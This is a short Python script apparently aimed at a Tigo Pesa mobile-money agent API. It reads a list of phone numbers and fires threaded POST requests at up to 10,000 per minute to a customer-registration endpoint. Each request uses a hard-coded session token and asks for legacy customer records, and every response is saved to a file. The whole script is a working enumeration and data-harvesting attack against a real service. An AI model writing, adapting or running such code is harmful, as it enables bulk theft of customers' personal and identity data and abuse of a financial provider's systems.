import requests
import concurrent.futures
import time


class Request:
    def __init__(self, BASE_URL, headers):
        self.BASE_URL = BASE_URL
        self.headers = headers


url = "https://tigopesagw.tigo.co.tz:5443/tigoagentapp_engrafilive?featureId=register.new.customer.view.web"  # Replace with your desired URL
filename = "test.txt"
output_filename = "response.txt"  # Name of the output file
num_threads = 10
requests_per_minute = 10000
delay = 60 / requests_per_minute

# Create the request object
headers = {
    "Content-Type": "application/json; charset=UTF-8",
    "Accept-Encoding": "gzip, deflate",
    "User-Agent": "okhttp/3.8.0",
    "Connection": "close"
}
construct = Request(url, headers)


def send_post_request(number):
    json_data = {
        "customerMsisdn": number[1:10],
        "idProofNumber": "",
        "isLegacyData": True,
        "isMobileRequest": True,
        "isTemporaryDetails": True,
        "pageNo": "1",
        "perPageCount": "100",
        "retailerId": "0",
        "SessionToken": "tigo_sess_93dc7a284f94f74ff042b29e5ab862da"
    }

    try:
        response = requests.post(construct.BASE_URL, headers=construct.headers, json=json_data)
        print(f"Response: {response.status_code}")

        with open(output_filename, 'a') as file:
            file.write(f"Number: {number}\n")
            file.write(f"Response: {response.text}\n\n")

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")


if __name__ == "__main__":
    with open(filename, 'r') as file:
        numbers = [line.strip() for line in file]

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []

        for number in numbers:
            future = executor.submit(send_post_request, number)
            futures.append(future)
            time.sleep(delay)  # Introduce delay between each request

        # Wait for all futures to complete
        concurrent.futures.wait(futures)

    print("All POST requests have been sent and responses have been saved to 'response.txt' file.")
